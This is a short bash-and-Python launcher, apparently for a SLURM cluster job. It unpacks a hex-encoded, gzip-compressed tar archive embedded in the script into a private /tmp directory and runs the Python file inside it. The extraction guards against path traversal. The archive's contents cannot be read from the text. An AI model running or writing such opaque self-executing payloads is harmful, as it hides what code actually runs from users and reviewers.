#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed95416fdb2014c77bf6a740b9604b11c1d8384eaa1c77df61db65aa2a8c71429a180bc8da6cda771fd85195a9d26e6d37edfd0ec6d8bcff83f77840c9de99fee655a1818ad2b1a52f5b5a14e5f3fbf4bd5a56cb1b445f775a1327e7850d2edfc2d75fc88f99370faa9fadd14c34346745c9ab65bd9acdd16c10e78311edbddb09c6ab38a25165b9e2b9aaba82b5ac9621a9a56899648cb3a213acaddb96aeaa9ad2a62bf24aae246f695b7151166a255b7aadda9cbd724194977951d72cfe3988feca990c2fb92c852c838060f9b2e6e5b2e52bc6685d73dee5b2c9255d1675d171ca39afaa8656252b6b5a325a503efbf9deb1fd17a06438bfba8f3fd77f9ee72feabf2c0ba8ffb7401f07633d7267378f17c17c27dceea09b79084aa70f2ae9ac39a241f8f8115d067f0cddc46e6293064322ecf6dbd7fc2ebb959ba841627dbb34b50b4cc7db0567c4aa50f25e3df934cb123199e2c560cd5e49bf90e6783cf5da9f17fbfd599dfa2dce16f22b1e4f267c1765fcf63b4e84732ab8bf4c914c47452a26f1f13c09ea64a79e5abd552eb8da6c82caefc718be4b1eb5dfa1cbfa8819549f8a0c0987fc3a419db14821dd8f1da43bd41b8f14e9c55191b851bc8bd6293656ee846def77395de06c2d4def757f52d736da450769868224260447d571dd935c468628b7b6423b85be88c3497db0d6d8147fee9de8e2248693c759901c362194035e4c86b743b454bd27c78756db74eab8cd277b5273f5a49dbf370f632f0b431fadf6ea121c4f4202ac907e9c989ab21213129318734c741f239cd2b9f3361d9d86bfe316b85a30d99be7ad7014ba4fe223b559f2de7b1900000000000000000000000000000000000000000000fe577e01cb55227000280000')
r=Path('/tmp')/('a'+j+'ab0123456789')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
